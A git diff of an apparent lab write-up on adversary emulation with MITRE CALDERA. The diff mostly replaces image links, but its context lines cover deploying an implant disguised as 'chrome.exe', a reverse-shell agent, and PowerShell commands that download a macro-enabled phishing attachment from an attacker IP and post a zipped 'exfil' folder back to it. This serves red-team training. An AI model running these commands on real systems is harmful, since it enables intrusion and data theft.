@@ -47,7 +47,7 @@ To start with, let's follow this guide to emulate a single adversary profile suc
 ﻿
 **Connecting to the CALDERA Instance** 
 
-![image.png](attachment:ca1b3c74-ed97-4016-b4cc-669c6ec30de8:image.png)
+<img width="1100" height="540" alt="image" src="https://github.com/user-attachments/assets/6a948aef-0edc-45bd-9a8c-d85d45385f72" />
 
 **Prerequisites:**
 
@@ -62,7 +62,7 @@ root@ip-10-10-1-65:~/Rooms/caldera/caldera# source ../caldera_venv/bin/activate
 
 ```
 
-![image.png](attachment:585d69e1-35a7-4f52-a406-f6bf5e11d759:image.png)
+<img width="1027" height="349" alt="image" src="https://github.com/user-attachments/assets/3981ec11-2fd2-4f1e-ab05-2210f23428fe" />
 
 **Second# Deploy an Agent:** An agent (implant) must be deployed on the victim machine to receive commands from CALDERA.
 
@@ -70,31 +70,31 @@ root@ip-10-10-1-65:~/Rooms/caldera/caldera# source ../caldera_venv/bin/activate
 - Configure the agent: Set the IP address to the AttackBox's IP and give the implant a deceptive name (e.g., **`chrome.exe`**).
 - Copy the generated PowerShell command from CALDERA and execute it on the victim machine. This downloads and runs the agent.
 
-![image.png](attachment:6aa936d0-21fc-4b90-baf7-eb7506aebc4b:image.png)
+<img width="1367" height="720" alt="image" src="https://github.com/user-attachments/assets/299dd218-58c8-4f8f-a5ee-bfbeb807ca52" />
 
-![image.png](attachment:68678575-c255-44b4-9bc4-dc1fe315c4b9:image.png)
+<img width="1400" height="572" alt="image" src="https://github.com/user-attachments/assets/062c58bf-f10f-4aee-881a-b34702c37c8d" />
 
-![image.png](attachment:9fa7101a-44f6-4983-9844-9018729c2ac5:image.png)
+<img width="1878" height="820" alt="image" src="https://github.com/user-attachments/assets/51eb10e1-cb02-4865-b9d7-ed107abafab0" />
 
-![image.png](attachment:916beadc-4bea-408e-8c17-63a073ad850f:image.png)
+<img width="1137" height="616" alt="image" src="https://github.com/user-attachments/assets/5db6ddeb-3c1c-441f-abe4-ae50490701ab" />
 
 Copy the reverse shell agent and paste it into the victim server
 
-![image.png](attachment:e3715955-8d17-403f-b5e7-d7c538886d04:image.png)
+<img width="1809" height="884" alt="image" src="https://github.com/user-attachments/assets/830b4e5f-1d04-4458-80a6-72f6e0331458" />
 
-![image.png](attachment:a569920f-7ff2-45db-9a50-7f8d8665a30a:image.png)
+<img width="1734" height="853" alt="image" src="https://github.com/user-attachments/assets/d679e168-94d6-42a7-952d-2f3e8b0b1640" />
 
 **Third#** **Select an Adversary Profile:** Choose a profile defining the attack techniques to emulate. The example uses the **"Enumerator"** profile, which contains five abilities for system enumeration.
 
 - It is crucial to **review the abilities** beforehand to understand the commands that will be executed on the victim (e.g., **`WMIC Process Enumeration`**).
 
-![image.png](attachment:b88be70b-4cb4-4fbd-aed2-e72bfd70050d:image.png)
+<img width="1430" height="826" alt="image" src="https://github.com/user-attachments/assets/678b41fe-93f9-4afa-8fbf-08ce0962fb48" />
 
-![image.png](attachment:6decdb23-4080-4a2a-af84-be20775e2f4a:image.png)
+<img width="1610" height="530" alt="image" src="https://github.com/user-attachments/assets/e1166e38-3de0-41f2-b803-dfd55ea7f315" />
 
  Click on the abilities to see the execution details.
 
-![image.png](attachment:223b5203-7a07-4a24-a081-f97c39d128af:image.png)
+<img width="1177" height="734" alt="image" src="https://github.com/user-attachments/assets/ff0978c4-012b-4d92-a0a6-46620156b20d" />
 
 **Four# Execute the Operation:** Run the emulation by creating a new operation.
 
@@ -105,24 +105,24 @@ Copy the reverse shell agent and paste it into the victim server
     - **Obfuscation:** Can be disabled for simplicity in this test.
 - Start the operation. CALDERA will task the agent to execute the abilities in the profile sequentially.
 
-![image.png](attachment:8f8f4336-ef95-4953-a896-68ef8fc37f24:image.png)
+<img width="1546" height="693" alt="image" src="https://github.com/user-attachments/assets/574adc10-b599-483a-b474-89bc16d5b50a" />
 
-![image.png](attachment:eb951c74-0d20-4305-b78a-9d02a3505a1b:image.png)
+<img width="1896" height="750" alt="image" src="https://github.com/user-attachments/assets/1cbbc777-bf50-4cfb-b04d-0b3884634e69" />
 
 **Five# Review the Results:** After the operation completes, review the results in the operation view.
 
 - For each ability, you can click **"View Command"** to see what was run and **"View Output"** to see the results (stdout/stderr) from the victim machine.
 - Note: Some abilities might fail; the operation can be rerun or continued as needed.
 
-![image.png](attachment:3a5f6f78-a8ae-4590-a160-7445f647e389:image.png)
+<img width="1125" height="292" alt="image" src="https://github.com/user-attachments/assets/e1572fe8-787f-4dc3-a3c6-811bab68c753" />
 
-![image.png](attachment:f44fb426-93dd-4113-944e-4155a7a0ce89:image.png)
+<img width="1156" height="702" alt="image" src="https://github.com/user-attachments/assets/17f77936-3674-4e8a-b771-2e119382eee6" />
 
 Some commands may not return output, such as this command for SysInternals PSTool Process Discovery
 
-![image.png](attachment:f51f1210-f902-4e5a-9401-530ced28abc7:image.png)
+<img width="1422" height="317" alt="image" src="https://github.com/user-attachments/assets/d6b01e56-b9fe-4ab4-b988-9126f14ce499" />
 
-![image.png](attachment:60eee0dd-b3e4-41bd-ac5f-6aca2a747058:image.png)
+<img width="1301" height="402" alt="image" src="https://github.com/user-attachments/assets/53deb2c4-c02e-4cf8-a8c3-25834112b21d" />
 
 ## In-Through-Out
 
@@ -145,9 +145,9 @@ Since the victim machine dose not have an internet connection, we mush host the 
 
 View the ability `Download Macro-Enabled Phishing Attachment` 
 
-![image.png](attachment:da7e4a9f-b64c-476f-bd03-e37bc14b8b4a:image.png)
+<img width="1412" height="680" alt="image" src="https://github.com/user-attachments/assets/f81ae3dc-005a-4fd9-8035-4aeb5188bd89" />
 
-![image.png](attachment:fb01115f-176c-46ed-9c31-af70ae7b1e24:image.png)
+<img width="1131" height="726" alt="image" src="https://github.com/user-attachments/assets/6b41bce7-8fbc-4089-a2cd-1aecda7ea3eb" />
 
 And change the URL to our attack IP machine and the listening port. Then save the ability
 
@@ -155,11 +155,11 @@ And change the URL to our attack IP machine and the listening port. Then save th
 $url = 'http://10.10.118.21:8080/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
 ```
 
-![image.png](attachment:ca612fa2-ea8c-4daa-b27c-cb51337fb202:image.png)
+<img width="1203" height="636" alt="image" src="https://github.com/user-attachments/assets/1a2f2ddf-09d5-43ec-8802-c446a2e91044" />
 
 The second ability to customise is  `Zip a Folder with PowerShell for Staging in Temp`
 
-![image.png](attachment:a1240a72-4961-4d5b-af89-ad3c72e307af:image.png)
+<img width="791" height="292" alt="image" src="https://github.com/user-attachments/assets/9ab6f002-8af3-43ba-ae9b-56ff2c77b7b0" />
 
 change the commands to this:
 
@@ -172,7 +172,7 @@ Remove-Item -Path $env:TEMP\exfil.zip -ErrorAction Ignore
 
 ```
 
-![image.png](attachment:7afaa905-5113-4a45-bf8d-3bc40d9586e0:image.png)
+<img width="1081" height="459" alt="image" src="https://github.com/user-attachments/assets/f2fa8580-aaca-4838-8a5a-fc91b4a89d38" />
 
 ### Creating a Custom Ability
 
@@ -185,13 +185,13 @@ $file="$env:TEMP\exfil.zip"; $destination="http://10.10.118.21:8080/"; $bytes=[S
 
 ```
 
-![image.png](attachment:8ae49b8b-8adb-4bca-84b8-a341697dc184:image.png)
+<img width="1114" height="640" alt="image" src="https://github.com/user-attachments/assets/19bf86ac-601b-488d-9bfe-96f17640a8ad" />
 
-![image.png](attachment:1688e4e2-d68e-452b-8568-145e0ea2e1ac:image.png)
+<img width="1174" height="638" alt="image" src="https://github.com/user-attachments/assets/5a53bfdf-e79c-4d0b-ac58-6dc9e4aa657d" />
 
 Once done, save it.
 
-![image.png](attachment:71ed894d-47d6-4e0f-b722-2c93f0506cfb:image.png)
+<img width="973" height="475" alt="image" src="https://github.com/user-attachments/assets/381b315e-904e-4e14-82b5-500b67300dcb" />
 
 ### **Creating a Custom Adversary Profile**
 
